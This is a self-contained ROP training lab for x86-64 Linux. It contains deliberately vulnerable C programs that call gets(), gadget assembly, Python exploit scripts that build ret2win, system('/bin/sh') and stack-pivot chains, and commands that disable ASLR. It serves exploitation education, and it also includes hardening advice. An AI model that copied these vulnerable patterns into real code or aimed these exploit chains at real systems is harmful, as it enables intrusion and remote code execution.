# Day 3 – ROP Training Binary Pack (Self-Contained Lab Assets)

> Purpose: give learners a deterministic, **pre‑built style** target with known gadgets and symbols so they can focus on understanding ROP chains—not hunting offsets. Everything runs locally on Linux/x86‑64 in a throwaway VM. Use only for defense education.

---

## ⚠️ Safety & Ethics (Read First)

* Use **only** in a disposable VM you control. Never test on systems you don’t own or have permission to assess.
* These binaries are intentionally vulnerable and compiled **without** mitigations to illustrate how defenses matter. Real software must ship with mitigations enabled.

---

## File Tree

```
rop-pack/
├─ README.md                      # step-by-step build/run guide (this doc)
├─ Makefile                       # one-command builds
├─ common.h                       # shared helpers/macros
├─ stage0_ret2win.c               # simplest: ret2win (no gadgets needed)
├─ stage1_rop_sys.c               # ROP to system("/bin/sh") using gadgets in binary
├─ stage2_pivot.c                 # ROP stack pivot + small ROP chain
├─ gadgets.S                      # inline assembly gadgets with stable labels
├─ exploit_stage0.py              # builds payload for stage 0
├─ exploit_stage1.py              # builds payload for stage 1 (symbol-aware)
├─ exploit_stage2.py              # builds payload for stage 2 (pivot)
├─ resolve.py                     # tiny helper: parse `nm -n` and spit symbol addresses
├─ .gdbinit-stage0                # preloaded gdb helpers for stage 0
├─ .gdbinit-stage1                # preloaded gdb helpers for stage 1
└─ .gdbinit-stage2                # preloaded gdb helpers for stage 2
```

> You can copy/paste each file below into a folder named `rop-pack/`, or split into files using your editor. Then run `make`.

---

## Makefile (drop-in)

```make
CC:=gcc
CFLAGS:=-m64 -O0 -fno-stack-protector -no-pie -z execstack -g
LDFLAGS:=-no-pie -z execstack

all: stage0 stage1 stage2

stage0: stage0_ret2win.c common.h
	$(CC) $(CFLAGS) $< -o $@ $(LDFLAGS)

stage1: stage1_rop_sys.c gadgets.S common.h
	$(CC) $(CFLAGS) stage1_rop_sys.c gadgets.S -o $@ $(LDFLAGS)

stage2: stage2_pivot.c gadgets.S common.h
	$(CC) $(CFLAGS) stage2_pivot.c gadgets.S -o $@ $(LDFLAGS)

clean:
	rm -f stage0 stage1 stage2 *.o a.out core core.*
```

---

## `common.h`

```c
#ifndef COMMON_H
#define COMMON_H
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define PROMPT(msg) do { \
  fputs(msg, stdout); \
  fflush(stdout); \
} while(0)

__attribute__((noinline)) static void banner(const char* title){
  puts("====================================");
  puts(title);
  puts("====================================");
}

#endif
```

---

## `gadgets.S` (stable gadgets with named labels)

```asm
.intel_syntax noprefix
.global gadget_ret
.type gadget_ret, @function
gadget_ret:
  ret

.global gadget_pop_rdi_ret
.type gadget_pop_rdi_ret, @function
gadget_pop_rdi_ret:
  pop rdi
  ret

.global gadget_pop_rsi_ret
.type gadget_pop_rsi_ret, @function
gadget_pop_rsi_ret:
  pop rsi
  ret

.global gadget_pop_rdx_ret
.type gadget_pop_rdx_ret, @function
gadget_pop_rdx_ret:
  pop rdx
  ret

.global gadget_leave_ret
.type gadget_leave_ret, @function
gadget_leave_ret:
  leave
  ret
```

---

## Stage 0 – `stage0_ret2win.c` (ret2win warm‑up)

* Goal: classic **ret2win**—overflow the buffer and set return address to `win()`.
* Teaches: finding RIP offset; `-no-pie` + `nm` to get `win` address; first shell.

```c
#include "common.h"

__attribute__((noinline)) void win(){
  banner("WIN REACHED — spawing /bin/sh");
  system("/bin/sh");
}

__attribute__((noinline)) void vuln(){
  char buf[64];
  PROMPT("stage0> enter data: ");
  // DELIBERATELY VULNERABLE
  gets(buf); // NOLINT — educational only
  puts("thanks!\n");
}

int main(){
  banner("Stage 0 — ret2win");
  vuln();
  puts("goodbye\n");
  return 0;
}
```

### Build & quick run

```bash
make stage0
# disable ASLR (root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
nm -n stage0 | grep ' win$'
```

Note the `win` address (e.g., `00000000004011a6 T win`).

### Find RIP offset (one-liner)

```bash
python3 - <<'PY'
import sys
pat = b"".join((bytes([i%256]) for i in range(1,400)))
sys.stdout.buffer.write(pat)
PY
```

Feed it under `gdb` to crash, inspect `RIP`, compute offset OR use `pwndbg/peda` if installed. For simplicity you can brute-force common offset **72** for this layout.

### Exploit (stage 0)

```python
# exploit_stage0.py
import struct, sys
OFFSET = 72  # adjust if needed after checking in gdb
WIN = 0x4011a6  # replace with your nm result
payload = b"A"*OFFSET + struct.pack('<Q', WIN)
sys.stdout.buffer.write(payload)
```

Run:

```bash
python3 exploit_stage0.py | ./stage0
```

You should drop into a shell. Exit with `exit`.

---

## Stage 1 – `stage1_rop_sys.c` (ROP to system("/bin/sh"))

* Goal: Use **gadgets** inside the binary to call `system("/bin/sh")`.
* Teaches: building a minimal chain `pop rdi; ret` → `system`.

```c
#include "common.h"

extern void gadget_pop_rdi_ret(void);
extern void gadget_ret(void);

__attribute__((noinline)) void safe(){ puts("(safe)\n"); }

__attribute__((noinline)) int call_system(const char* s){ return system(s); }

static const char BINSH[] = "/bin/sh"; // lives in .rodata with stable address

__attribute__((noinline)) void vuln(){
  char buf[64];
  PROMPT("stage1> input: ");
  gets(buf); // vulnerable by design
}

int main(){
  banner("Stage 1 — ROP to system('/bin/sh')");
  vuln();
  puts("done\n");
  return 0;
}
```

### Build & inspect

```bash
make stage1
nm -n stage1 | egrep ' BINSH| call_system$| gadget_pop_rdi_ret$| gadget_ret$'
```

You’ll capture addresses for:

* `gadget_pop_rdi_ret`
* `gadget_ret` (sometimes handy for alignment)
* `call_system` (wrapper around `system` avoids PLT complexity)
* `BINSH` string

### Exploit (stage 1)

```python
# exploit_stage1.py
import subprocess, re, struct, sys

# pull symbol addresses deterministically via nm
nm = subprocess.check_output(["nm","-n","stage1"]).decode()
syms = {}
for line in nm.splitlines():
    m = re.match(r"^([0-9a-fA-F]+)\s+[A-Za-z]\s+(\S+)$", line)
    if m:
        syms[m.group(2)] = int(m.group(1),16)

OFFSET = 72  # adjust if your layout differs
pop_rdi = syms['gadget_pop_rdi_ret']
call_sys = syms['call_system']
binsh   = syms['BINSH']

chain = [
    pop_rdi,
    binsh,
    call_sys,
]

payload = b"A"*OFFSET + b"".join(struct.pack('<Q', x) for x in chain)
sys.stdout.buffer.write(payload)
```

Run:

```bash
python3 exploit_stage1.py | ./stage1
```

> If you crash, verify `OFFSET` in `gdb` and that addresses match `nm -n` exactly. All binaries are `-no-pie`, so addresses should be fixed.

---

## Stage 2 – `stage2_pivot.c` (Stack pivot + mini‑ROP)

* Goal: learn **stack pivoting** using `leave; ret` into a controlled heap buffer, then execute a chain there.

```c
#include "common.h"
#include <stdint.h>
#include <malloc.h>

extern void gadget_leave_ret(void);
extern void gadget_pop_rdi_ret(void);

static const char BINSH[] = "/bin/sh";
int call_system(const char* s){ return system(s); }

__attribute__((noinline)) void vuln(){
  // tiny stack buf forces pivot attack style
  char small[16];
  void* pivot = malloc(0x200);
  PROMPT("stage2> input: ");
  // layout we expect attacker to write:
  // [padding..][new RBP][pivot_addr][gadget_leave_ret]
  gets(small);
  (void)pivot; // keep it from optimizing away
}

int main(){
  banner("Stage 2 — Pivot + ROP chain");
  vuln();
  puts("done\n");
  return 0;
}
```

### Build & symbols

```bash
make stage2
nm -n stage2 | egrep ' BINSH| call_system$| gadget_pop_rdi_ret$| gadget_leave_ret$'
```

### Exploit sketch (stage 2)

The idea is:

1. Overwrite saved RBP with address of **heap pivot buffer** (which you will also fill via a second write or a long input that spills over).
2. Overwrite return address with `gadget_leave_ret`.
3. The `leave` sets `RSP=RBP` (your heap) and `RBP=[RSP]; ret` jumps into your chain living on heap.
4. Heap chain begins with `pop rdi; ret`, then pointer to `BINSH`, then `call_system`.

A minimal helper (pseudo‑exploit):

```python
# exploit_stage2.py (skeleton)
import struct, subprocess, re, sys
nm = subprocess.check_output(["nm","-n","stage2"]).decode()
syms = {m.group(2):int(m.group(1),16) for line in nm.splitlines()
        if (m:=re.match(r"^([0-9a-fA-F]+)\s+[A-Za-z]\s+(\S+)$", line))}

pop_rdi = syms['gadget_pop_rdi_ret']
leave_ret = syms['gadget_leave_ret']
call_sys = syms['call_system']
binsh = syms['BINSH']

OFFSET = 24  # toy value; confirm in gdb (16 bytes buf + saved RBP + RET)

# Fake "heap" chain we pretend to land on, beginning with next RBP
pivot_chain = [
    0x0,            # next RBP (dummy)
    pop_rdi,
    binsh,
    call_sys,
]

# In a single input: small padding + new RBP (heap addr) + RET=leave;ret + then the heap chain bytes
heap_addr = 0x404800  # choose a writable addr visible in maps or from malloc() leak during debugging
payload  = b"A"*16
payload += struct.pack('<Q', heap_addr)     # saved RBP -> heap
payload += struct.pack('<Q', leave_ret)     # RET -> leave;ret
payload += b"B"*16                          # (optional spacing)
payload += b"".join(struct.pack('<Q', x) for x in pivot_chain)

sys.stdout.buffer.write(payload)
```

Run while watching in `gdb` and adjust `OFFSET` and `heap_addr` for your run; or split interaction into two writes if you prefer a cleaner pivot (leak heap ptr first via `printf` bug—left as a challenge).

---

## GDB mini‑guides

**`.gdbinit-stage1`**

```
set disassembly-flavor intel
handle SIGALRM SIGPIPE nostop noprint
b *main
run
info functions gadget
p/x gadget_pop_rdi_ret
p/x call_system
p/x BINSH
```

**Useful commands**

```
pattern create 200               # if using pwndbg
run < <(python3 exploit_stage1.py)
x/20gx $rsp                      # inspect chain on stack
bt                               # backtrace
si / ni                          # step/next
```

---

## System settings used in the lab

```bash
# Disable ASLR during learning runs (root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Re‑enable later
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Rust bonus (optional): mirror Stage 1 in `unsafe` Rust

Create `Cargo.toml` and `src/main.rs` mirroring the C layout: a tiny `vuln()` with `gets` via `libc` FFI, a `call_system` wrapper using `std::process::Command`, and export C‑ABI gadget stubs from an `.S` file added via a `build.rs`. Keep `RUSTFLAGS='-C link-args=-no-pie -C overflow-checks=off'` and compile with `-Z` flags if on nightly; confirm addresses with `nm -n target/debug/…` and rebuild the same chains.

---

## Reflection & Short‑Answer Prompts

1. Which mitigations did we deliberately disable, and how did each change exploit difficulty?
2. Why does `-no-pie` stabilize symbol addresses, and how does PIE interact with ASLR?
3. What are two ways to break a ROP chain once DEP/NX is already in place?
4. How would you adapt the Stage 1 chain if the binary had **full RELRO** and no PLT resolution at runtime?

---

## Troubleshooting Checklist

* Crashing before shell? Confirm **OFFSET** by checking `$rsp` alignment and saved `RIP` overwrite in `gdb`.
* Wrong addresses? Re-run `nm -n <binary>` after **every rebuild**; addresses shift with code edits.
* PIE accidentally enabled? Ensure both compile and link use `-no-pie`.
* Stack protector sneaking in? Verify `-fno-stack-protector` in final link step (`readelf -p .note.GNU-stack` helpful).

---

## Mermaid Map — Concept → Practice

```mermaid
flowchart LR
  A[Mitigations Recap] --> B[ret2win]
  B --> C[ROP Gadgets]
  C --> D[System: Shell]
  D --> E[Pivoting]
  E --> F[Re‑enable Mitigations]
  F --> G[Hardening Playbook]
```

---

### Hardening Playbook (tie‑back for defenders)

* Compile with **PIE**, **stack protector**, **FORTIFY\_SOURCE**, **RELRO**, **CFI** (where available).
* Enable **ASLR** and **CET/Shadow Stack** if your CPU/OS support it.
* Minimize and audit `unsafe` blocks in Rust; prefer safe APIs and fuzz with `cargo fuzz`.
* Add **sanitizers** and **UBSAN** in CI; treat warnings as build breakers.

Happy (and ethical) hacking! 🛡️🗝️
